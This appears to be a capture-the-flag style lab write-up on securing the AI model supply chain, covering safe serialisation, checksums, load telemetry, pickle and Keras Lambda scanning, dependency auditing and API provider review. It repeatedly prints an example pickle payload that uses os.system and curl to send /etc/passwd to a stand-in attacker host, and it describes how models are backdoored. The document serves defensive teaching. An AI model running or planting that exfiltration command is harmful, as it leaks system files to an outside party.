# Securing the AI Supply Chain — TryHackMe Write-Up

> **Module:** AI Supply Chain Security  
> **Room:** Securing the AI Supply Chain  
> **Framework Alignment:** OWASP LLM03 | MITRE ATLAS AML.T0010 | NIST AI RMF Govern 1.2 / Measure 2.2 / Manage 2.1  

---

## Table of Contents

- [Task 1 – Introduction](#task-1--introduction)
- [Task 2 – Safe Serialisation (Pickle Defence)](#task-2--safe-serialisation-pickle-defence)
- [Task 3 – Model Integrity Verification](#task-3--model-integrity-verification)
- [Task 4 – Model Loading Telemetry](#task-4--model-loading-telemetry)
- [Task 5 – Static Model Scanning (Fickling & ModelScan)](#task-5--static-model-scanning-fickling--modelscan)
- [Task 6 – Architecture-Level Threats (Lambda Layers)](#task-6--architecture-level-threats-lambda-layers)
- [Task 7 – Deep Architecture Inspection](#task-7--deep-architecture-inspection)
- [Task 8 – Dependency Auditing & SBOMs](#task-8--dependency-auditing--sboms)
- [Task 9 – API Provider Assessment](#task-9--api-provider-assessment)
- [Key Lessons](#key-lessons)
- [Defence Summary](#defence-summary)

---

## Task 1 – Introduction

### What This Room Is About

This room builds the **SupplySecLab** — a security testing lab that closes every gap from the TryTrainMe breach in the previous room (Supply Chain Attack Vectors).

The breach involved:
- A **malicious pickle file** disguised as a legitimate model
- A **fake repository** serving malicious code
- **Dependency confusion** sneaking in a bad package

After investigating that breach, you've been promoted to Security Engineer. Your job: build defences so it never happens again.

### Room Roadmap

| Task | Gap from Breach | Defence |
|------|----------------|---------|
| 2 | No policy on model formats | SafeTensors + `weights_only=True` |
| 3 | Model integrity never checked | SHA-256 checksums + model card review |
| 4 | No telemetry on model loading | Session event stream monitoring |
| 5 | Models never scanned before deployment | Fickling + ModelScan |
| 6 | Hidden logic in model architecture undetected | Lambda layer detection |
| 7 | No deep architecture inspection | h5py + ModelScan H5LambdaDetectScan |
| 8 | Dependencies never audited | pip-audit + SBOMs with Syft |
| 9 | External prompts never reviewed | API provider assessment + behaviour monitoring |

---

## Task 2 – Safe Serialisation (Pickle Defence)

### The Problem

Python's **pickle format** is used to save and load ML model weights. The danger: pickle can execute **any Python code hidden inside it** the moment you load the file.

An attacker embeds something like this:
```python
# Hidden inside the pickle file — runs automatically on load
os.system("curl http://attacker.com/exfil -d @/etc/passwd")
```
You load the model → credentials stolen → you never knew it happened.

### Defence 1: SafeTensors

SafeTensors is a serialisation format created by Hugging Face **specifically** for ML model weights. Its core guarantee: **no code execution is possible during loading.**

| Feature | Pickle | SafeTensors |
|---------|--------|-------------|
| Can run code? | ✅ YES — dangerous | ❌ NO — safe by design |
| What it stores | Any Python object | Only tensor data (weights/biases) |
| Validation | None — loads blindly | Parses and validates header first |
| Speed | Moderate | Fast — zero-copy memory mapping |

**Real-world analogy:** Pickle is a USB stick that can autorun malware. SafeTensors is a USB stick that can only store documents — nothing can autorun.

**How to convert from pickle to SafeTensors:**
```python
import torch
from safetensors.torch import save_file, load_file

# Step 1: Load existing pickle model (with weights_only=True for safety during conversion)
model_weights = torch.load("model.pkl", weights_only=True)

# Step 2: Save as SafeTensors — clean, safe format
save_file(model_weights, "model.safetensors")

# Step 3: Load SafeTensors — always safe
safe_weights = load_file("model.safetensors")
```

> ⚠️ The conversion step still requires loading the pickle — that's where a malicious payload could fire. Tasks 4 & 5 cover how to verify a pickle is safe before loading.

### Defence 2: `weights_only=True`

When you can't switch to SafeTensors immediately, restrict what pickle can do:

```python
# ❌ UNSAFE — pickle can execute any embedded code
model = torch.load("model.pt")

# ✅ SAFE — pickle restricted to tensor reconstruction only
model = torch.load("model.pt", weights_only=True)
```

**Analogy:** Puts pickle in a straitjacket — it can still carry model weights, but it **cannot execute code**.

> From **PyTorch 2.6+**, `weights_only=True` is the default. On older versions you must set it explicitly.

### Limitations

SafeTensors is not a complete defence on its own:

| Risk | Explanation |
|------|-------------|
| Disguised files | A `.safetensors` extension can contain pickle bytecode inside (CVE-2023-6730). Never trust file extensions alone. |
| Inference-time attacks | SafeTensors only protects at load time. Malicious logic inside the model architecture (e.g. Keras Lambda layers) fires at prediction time. |

---

## Task 3 – Model Integrity Verification

### The Problem

SafeTensors stops code at load time — but it doesn't tell you if the model was **swapped or tampered with** after the author published it. In the TryTrainMe breach, no checksum was ever published, so a replacement model went undetected.

### Concept 1: SHA-256 Checksums

A checksum is a unique **fingerprint** of a file. SHA-256 generates a fixed-length string from the file's contents. **If even one byte changes, the checksum changes completely.**

```
Original file  →  a3f8c2d1e9b4...  ✅ matches published hash
Tampered file  →  9b7e4f221a3c...  ❌ mismatch = tampered
```

**Analogy:** Like a wax seal on a letter — if anyone opened and resealed it, you'd know.

### Lab Commands

```bash
# Step 1: View expected checksums published by the model author
cat /opt/supply-chain/models/checksums.json

# Step 2: Compute actual hashes of the files on disk
sha256sum /opt/supply-chain/models/product_recommender.safetensors \
          /opt/supply-chain/models/model_review_v2.pkl \
          /opt/supply-chain/models/product_recommender.pkl

# Step 3: Compare — one file's hash will not match (tampered model)
```

### Concept 2: Model Cards

A model card is the **documentation passport** that ships with a model. When reviewing a model's provenance, check:

| Section | What to Look For | 🚩 Red Flag |
|---------|-----------------|------------|
| Model Details | Author, org, version, licence | Missing author or licence |
| Intended Use | What it's designed for | Vague or overly broad claims |
| Training Data | Dataset name, size, source | No training data described |
| Performance | Benchmark metrics | No metrics or unrealistically high scores |
| Limitations | Known failure modes | "No limitations" = incomplete |

> **Rule:** A missing or sparse model card is one of the strongest warning signs of a suspicious model.

### Concept 3: LoRA Adapters & Conversion Services

Two modern risks often overlooked:

**LoRA Adapters:** Small fine-tuning files that bolt onto a base model. Often shared by third-party contributors. A clean base model + malicious adapter = **compromised model**. Scan and verify adapters with the same rigour as full models.

**Conversion Services:** Third-party platforms that convert model formats run in shared environments. The output may not match what the original author published. Treat any model through a third-party pipeline as a **new untrusted artefact**.

### The 5-Step Model Acquisition Framework

Every model must pass all 5 gates before reaching production:

| Step | Action | Why |
|------|--------|-----|
| 1. Quarantine | Download to isolated staging, never directly to production | Prevent untested artefacts reaching live systems |
| 2. Source Verification | Check author, org, repo, badges, community reputation | Establish provenance |
| 3. Integrity Check | SHA-256 vs published value | Confirm file wasn't tampered with |
| 4. Security Scan | Fickling, ModelScan, model card review | Detect malicious content |
| 5. Approve or Reject | Promote to production or quarantine permanently | Enforce the trust gate |

> No single step is sufficient. A model can pass all scanning tools but still contain a data poisoning backdoor. **Multiple independent checks = defence in depth.**

---

## Task 4 – Model Loading Telemetry

### The Problem

A malicious model at TryTrainMe passed its checksum, came from a credible-looking organisation, and showed nothing in deployment logs. The only signal was the **session event telemetry** — and nobody was watching it.

### Clean Load Baseline

A legitimate model load produces exactly 5 events, contained within the file boundary:

```
SESSION START — model_load
MODEL LOAD BEGIN — /models/sentiment_model.pkl (pickle)
FILE ACCESS — /models/sentiment_model.pkl (rb) [normal]
MODEL LOAD COMPLETE — object_type: SentimentModel
SESSION STOP — model_load
```

File is read → model object returned → nothing else happens.

### Malicious Load — What It Looks Like

Three extra events appear that have no place in a clean load:

```
SESSION START — model_load
MODEL LOAD BEGIN — /models/malicious_model.pkl (pickle)
FILE ACCESS — /models/malicious_model.pkl (rb) [normal]
IMPORT — os [DANGEROUS]
SYSTEM CALL — os.system('curl http://attacker.com/exfil -d @/etc/passwd') [CRITICAL]
SYSTEM CALL — connect(attacker.com:80) [CRITICAL]
MODEL LOAD COMPLETE — object_type: int
SESSION STOP — model_load
```

| Event | Flag | What It Means |
|-------|------|---------------|
| `IMPORT os` | `[DANGEROUS]` | Model imported OS module — models never need this |
| `SYSTEM CALL` | `[CRITICAL]` | Executed a shell command |
| `SYSTEM CALL` | `[CRITICAL]` | Tried to exfiltrate `/etc/passwd` externally |
| `object_type: int` | ⚠️ Warning | Returned an integer, not a usable model |

> **The model still responded normally to queries.** Without telemetry, the attack is completely invisible.

### How Telemetry Works (Technical)

| Method | How |
|--------|-----|
| `sys.addaudithook()` | Python 3.8+ — intercepts `import`, `os.system`, `subprocess` calls before they execute |
| Custom unpickler `find_class()` | Logs every module pickle tries to resolve during unpickling |

Both approaches generate the session stream **before any model reaches a trusted registry.**

---

## Task 5 – Static Model Scanning (Fickling & ModelScan)

### The Core Idea

Task 4 showed the attack **firing live**. These tools catch the payload **before it ever executes** — by inspecting the file statically (without running it).

### Tool 1: Fickling (by Trail of Bits)

**What it does:** Decompiles pickle bytecode back into readable Python **without executing the file**.

```bash
# Decompile the tampered model — reveals hidden payload
fickling /opt/supply-chain/models/model_review_v2.pkl
```

Output:
```python
from os import system
_var0 = system('curl http://attacker.com/exfil -d @/etc/passwd')
result0 = _var0
```
The attack is immediately visible — imports `os.system` and runs a curl exfiltration command.

```bash
# Decompile the clean model — no imports, no calls, nothing to flag
fickling /opt/supply-chain/models/product_recommender.pkl

# Automated safety check — print to terminal
fickling --check-safety -p /opt/supply-chain/models/model_review_v2.pkl

# Safety check on clean model — silence = no issues
fickling --check-safety -p /opt/supply-chain/models/product_recommender.pkl
```

> Without `-p`, results are written silently to `safety_results.json` instead of the terminal.

### Tool 2: ModelScan (by Protect AI)

**What it does:** Extends beyond pickle — scans PyTorch, TensorFlow, and Keras formats. Assigns **severity levels** to findings.

```bash
# Scan tampered model
modelscan -p /opt/supply-chain/models/model_review_v2.pkl
```

Output:
```
--- Summary ---
Total Issues: 1
    - CRITICAL: 1

--- CRITICAL ---
Unsafe operator found:
  - Severity: CRITICAL
  - Description: Use of unsafe operator 'system' from module 'os'
  - Source: /opt/supply-chain/models/model_review_v2.pkl
```

```bash
# Scan SafeTensors model
modelscan -p /opt/supply-chain/models/product_recommender.safetensors
```

Output:
```
--- Summary ---
No issues found! 🎉
```

> ⚠️ CUDA warnings are cosmetic (no GPU in the lab VM). Focus on the `--- Summary ---` section. Scan can take up to 2 minutes — that's normal.

### Severity Reference

| Severity | Example | Action |
|----------|---------|--------|
| CRITICAL | `os.system`, `subprocess` | 🚫 Do not use. Quarantine immediately. |
| HIGH | `eval`, network calls | 🚫 Do not use without thorough review |
| MEDIUM | Custom unpickler | ⚠️ Review carefully |
| LOW | Non-standard pickle opcodes | 📝 Note and monitor |

### Fickling vs ModelScan

| | Fickling | ModelScan |
|--|---------|-----------|
| Made by | Trail of Bits | Protect AI |
| Formats | Pickle only | Pickle, PyTorch, TF, Keras + more |
| Method | Decompiles to readable Python | Pattern-based severity scanning |
| Best for | Understanding *what* the payload does | Quick pass/fail gate in a pipeline |

> **Important:** Neither tool catches everything. Sophisticated attackers use obfuscation to evade detection. Scanning is one layer — not a guarantee.

---

## Task 6 – Architecture-Level Threats (Lambda Layers)

### The Problem

Fickling and ModelScan catch **serialisation-based attacks**. But attackers have another technique: hiding malicious logic **inside the model's architecture itself** using Keras Lambda layers.

**What a Lambda layer is:** Normally used by developers to embed custom Python functions during training. Attackers repurpose them to hide malicious code.

**Why this is especially dangerous:**

| Property | Pickle Attack | Lambda Layer Attack |
|----------|--------------|-------------------|
| When does it fire? | On `pickle.load()` | Every **prediction** the model makes |
| Passes checksum? | Can be crafted to | ✅ Yes |
| Caught by Fickling? | ✅ Yes | ❌ No |
| Caught by ModelScan? | ✅ Yes | ❌ No |
| Survives format conversion? | ❌ No | ✅ Yes (.h5, .keras, SafeTensors) |
| Visible in file properties? | Sometimes | ❌ Identical to clean model |

> The model loads cleanly, passes every scan, looks completely normal — and only triggers when processing real data.

### Clean Baseline vs Compromised Model

**Clean model — 4 layers, all normal:**
```
SESSION START — model_inspect
LAYER — InputLayer "input_layer" [clean]
LAYER — Flatten "flatten" [clean]
LAYER — Dense "dense" [clean]
LAYER — Dense "dense_1" [clean]
MODEL INSPECT COMPLETE — 4 layers, 0 suspicious
SESSION STOP — model_inspect
```

**Compromised model — 5 layers, 1 suspicious:**
```
SESSION START — model_inspect
LAYER — InputLayer "input_layer" [clean]
LAYER — Flatten "flatten" [clean]
LAYER — Dense "dense" [clean]
LAYER — Dense "dense_1" [clean]
LAYER — Lambda "normalize_output" [SUSPICIOUS] ⚠️
MODEL INSPECT COMPLETE — 5 layers, 1 suspicious
SESSION STOP — model_inspect
```

The **architecture inspection is the only way** to detect this. File size, format, and all properties look identical to the clean model.

---

## Task 7 – Deep Architecture Inspection

### The Goal

The telemetry in Task 6 told you *something suspicious is there*. These tools tell you **what it actually is** — the layer name, what code it runs, what it's configured to do.

### Tool 1: ModelScan (H5LambdaDetectScan)

```bash
modelscan -p /opt/supply-chain/models/image_classifier_v2.h5
```

Output:
```
--- Summary ---
Total Issues: 1
    - MEDIUM: 1

--- MEDIUM ---
Unsafe operator found:
  - Severity: MEDIUM
  - Description: Use of unsafe operator 'Lambda' from module 'Keras'
  - Source: /opt/supply-chain/models/image_classifier_v2.h5
```

> Severity is **MEDIUM** (not CRITICAL) because Lambda layers have legitimate uses. The scanner flags for review, not automatic quarantine.

### Tool 2: inspect_h5_model.py (using h5py)

Reads the `.h5` file structure **without loading or executing the model.**

```bash
# Inspect clean model for baseline
python3 /opt/supply-chain/tools/inspect_h5_model.py \
        /opt/supply-chain/models/image_classifier.h5

# Inspect suspicious model — look for [WARNING] layers
python3 /opt/supply-chain/tools/inspect_h5_model.py \
        /opt/supply-chain/models/image_classifier_v2.h5
```

What to look for:
- **More layers** than the clean model
- Any layer marked `[WARNING]` instead of `[OK]`
- Lambda layers with **disguised names** — attackers name them things like `normalize_output` or `apply_scaling` to blend in

### The Critical Gap — Summary

| Defence | Stops Pickle Attack | Stops Lambda Attack |
|---------|-------------------|-------------------|
| SafeTensors | ✅ Yes | ❌ No |
| Fickling | ✅ Yes | ❌ No |
| ModelScan (pickle) | ✅ Yes | ❌ No |
| ModelScan H5LambdaDetectScan | N/A | ⚠️ Flags as MEDIUM |
| inspect_h5_model.py | N/A | ✅ Reveals exact layer name |

> A malicious Lambda layer behaves identically whether stored as `.h5`, `.keras`, or SafeTensors — the attack lives in the architecture, not the file format. You **must** inspect the architecture.

---

## Task 8 – Dependency Auditing & SBOMs

### The Problem

Model files aren't the only attack surface. Every Python package that ships with the model is also a potential vector — as the TryTrainMe breach proved with a typosquatted package.

> "The name matches. The version is slightly off. On the shelf, it looks identical to the one you ordered."

### Concept 1: Version Pinning

Lock your `requirements.txt` to exact versions so pip can't accidentally pull in a malicious update:

```python
# ❌ BAD — pulls whatever is newest (could be malicious)
numpy
requests

# ⚠️ BETTER — pins major.minor but allows patches
numpy>=1.24,<1.25

# ✅ BEST — exact version, no surprises ever
numpy==1.24.3
requests==2.31.0
```

### Concept 2: Lockfiles

Goes further than version pinning — records the **exact version AND cryptographic hash** of every package:

| Tool | Lockfile | Command |
|------|----------|---------|
| pip-compile (pip-tools) | `requirements.txt` with hashes | `pip-compile --generate-hashes` |
| Poetry | `poetry.lock` | `poetry lock` |

Even if an attacker replaces a package on PyPI with the **same version number but different contents**, the hash mismatch blocks installation.

### Tool 1: pip-audit

Scans your project's dependencies against known vulnerability databases.

```bash
pip-audit -r /opt/supply-chain/project/requirements.txt
```

Output shows for each vulnerable package:
- Package name
- Installed version
- Advisory ID (CVE reference)
- Fixed version to upgrade to

### Concept 3: Private Package Index

Strongest defence against dependency confusion — configure pip to always resolve internal packages privately:

```ini
# ~/.pip/pip.conf
[global]
index-url = https://your-private-pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/
```

- `index-url` = **primary source** — checked first, always
- `extra-index-url` = **fallback** — only consulted if package not found in primary

Internal packages always resolve from your private registry → public PyPI is never reached for them → dependency confusion eliminated.

### Concept 4: SBOMs (Software Bill of Materials)

A complete **ingredient list** for your software — every package, library, framework, and version.

**Why it matters:** When Log4Shell dropped in 2021, organisations with SBOMs instantly knew if they were affected. Those without SBOMs spent days manually crawling dependency trees.

**Two dominant formats:**

| Format | Maintained By | Best For |
|--------|--------------|----------|
| SPDX | Linux Foundation | Licence compliance (ISO standard) |
| CycloneDX | OWASP | Security-focused, includes vulnerability data |

### Tool 2: Syft (by Anchore)

Generates SBOMs by analysing your project directory.

```bash
# Generate SBOM in CycloneDX JSON format
syft /opt/supply-chain/project/ --exclude './venv/**' -o cyclonedx-json > /tmp/sbom.json

# View as a human-readable table
syft /opt/supply-chain/project/ --exclude './venv/**' -o table

# Explore the full JSON structure
cat /tmp/sbom.json | python3 -m json.tool | less
```

> ⚠️ `i/o timeout` warning is expected in offline environments — doesn't affect output.

### ML-Specific SBOM Gap

Standard SBOMs cover software packages but miss ML-specific components:

| Standard SBOM Covers | ML SBOM Should Also Cover |
|---------------------|--------------------------|
| Python packages | Model provenance (who trained it, on what data) |
| Libraries/frameworks | Dataset lineage (source, transformations, biases) |
| Versions | Model performance metrics + known limitations |

**Workaround:** Supplement your SBOM with a **model card** (Task 3) for ML-specific coverage.

---

## Task 9 – API Provider Assessment

### The Problem

All previous tools assume **a file on disk**. When you call an external LLM API (OpenAI, Anthropic, OpenRouter), there is no file. You're trusting:

- Training data you can't inspect
- Fine-tuning decisions you can't verify
- Infrastructure you don't control
- Model versioning that can **change silently behind the same endpoint**

> The API call is one line of code. The decision behind it is a checklist.

### Defence 1: Provider Due Diligence

Before integrating any third-party LLM:

| Factor | What to Verify | 🚩 Red Flag |
|--------|---------------|------------|
| Data handling | Privacy policy, data retention, opt-out options | "We may use your data" with no opt-out |
| Model versioning | Versioned endpoints, changelogs, deprecation notices | Model changes without notification |
| Security certifications | SOC 2, ISO 27001, penetration testing | No published security documentation |
| Incident response | Disclosed vulnerabilities, response timeline | No security contact or disclosure policy |
| Transparency | Model cards, training data documentation | Undocumented model behaviour changes |

### Defence 2: Behaviour Monitoring

Since you can't inspect API model weights, **monitor outputs instead.**

- Run a **fixed set of test prompts** periodically
- Flag significant changes in responses
- Track: factual accuracy, response format, refusal rates, latency, error rates

> This is the **API equivalent of checksum verification** — you can't verify the file, so you verify the behaviour. Establish a **behavioural baseline**.

### Defence 3: System Prompt Governance

System prompts sourced from public repositories = **supply chain artefacts.**

**The lab demonstrated this perfectly:**

| Query | Config A (Internal — Governed) | Config B (Public repo — Ungoverned) |
|-------|-------------------------------|-------------------------------------|
| Return policy? | 30-day window, replacement only, support@trytrainme.com | ❌ 60-day window, full refund, wrong company name (TryTrainML) |
| Who has admin access? | Refuses — redirects to privacy policy | ❌ Attempts to answer — guardrail missing |

Same model. Same endpoint. **Only the system prompt source changed** — and everything about the response is wrong.

**Rules for system prompt governance:**
- Version-control all system prompts
- Review changes through standard code review process
- Test prompt changes against behavioural baseline before deployment
- Treat system prompts with the **same rigour as code**

### Defence 4: Sandboxed Evaluation

For API-served models (black boxes), run dynamic evaluation before production:

| Phase | Activity | Pass Condition |
|-------|----------|---------------|
| 1 | Load in isolated sandbox | Loads without errors |
| 2 | Fixed prompt battery | Answers match known-correct responses |
| 3 | Adversarial probes | Safety boundaries hold |
| 4 | Baseline comparison | Output matches existing model |
| Result | Promote or reject | All pass → Production / Any fail → Reject |

> Don't rely solely on published benchmarks — a model can pass standard safety evals while containing targeted backdoors that only activate on specific inputs.

### File-Based vs API Security — Direct Mapping

| File-Based Defence (Tasks 3–8) | API Equivalent (Task 9) |
|-------------------------------|------------------------|
| Source verification | Provider due diligence |
| Checksum verification | Behaviour monitoring (behavioural baseline) |
| Security scanning | System prompt governance |
| Staging gate | Sandboxed evaluation |

---

## Key Lessons

1. **Safe serialisation is necessary but not sufficient.** SafeTensors eliminates pickle-based code execution but does nothing against architecture-level attacks.

2. **A model can pass every scan and still be compromised.** Lambda layers fire at inference time, not load time. Scanning serialisation format ≠ inspecting architecture.

3. **File extensions cannot be trusted.** A `.safetensors` file can contain pickle bytecode (CVE-2023-6730). Always verify actual content.

4. **System prompts are supply chain artefacts.** An ungoverned prompt from a public repo can make a trusted model give completely wrong answers — without touching the model or endpoint.

5. **No single defence is sufficient.** Defence in depth means multiple independent checks at every layer.

6. **The telemetry is the only signal.** A malicious model can respond normally to every query. Without session event monitoring, the attack is invisible.

7. **Checksums verify files. Behaviour monitoring verifies APIs.** Same instinct, different implementation.

---

## Defence Summary

| Layer | Threat | Tool / Practice |
|-------|--------|----------------|
| Serialisation format | Pickle code execution at load time | SafeTensors + `weights_only=True` |
| File integrity | Model replaced/tampered in transit | SHA-256 checksums |
| Provenance | Unknown or undocumented model source | Model card review |
| Static pickle analysis | Hidden malicious code in pickle | Fickling (Trail of Bits) |
| Multi-format scanning | Malicious operators in any model format | ModelScan (Protect AI) |
| Architecture inspection | Lambda layers firing at inference time | inspect_h5_model.py + ModelScan H5LambdaDetectScan |
| Load time monitoring | Detecting attacks as they fire | Python audit hooks (`sys.addaudithook`) |
| Dependency vulnerabilities | Known CVEs in project packages | pip-audit |
| Dependency confusion | Typosquatted / version-manipulated packages | Version pinning + lockfiles + private index |
| Software inventory | Unknown what's actually deployed | Syft (SBOM generation) |
| API provider trust | Opaque third-party model pipelines | Provider due diligence checklist |
| Silent model updates | Provider changes model behind same endpoint | Behavioural baseline monitoring |
| Prompt integrity | Ungoverned prompts altering LLM behaviour | System prompt version control + review |
| API evaluation | Backdoors in black-box models | Sandboxed evaluation with adversarial probes |

---

## Framework Alignment

| Framework | Reference | Coverage in This Room |
|-----------|-----------|----------------------|
| OWASP LLM Top 10 | LLM03: Supply Chain Vulnerabilities | All tasks |
| MITRE ATLAS | AML.T0010: ML Supply Chain Compromise | Tasks 2–7 |
| NIST AI RMF | Govern 1.2 | Task 9 (provider governance) |
| NIST AI RMF | Measure 2.2 | Tasks 3, 4 (integrity + telemetry) |
| NIST AI RMF | Manage 2.1 | Task 8 (dependency management) |

---

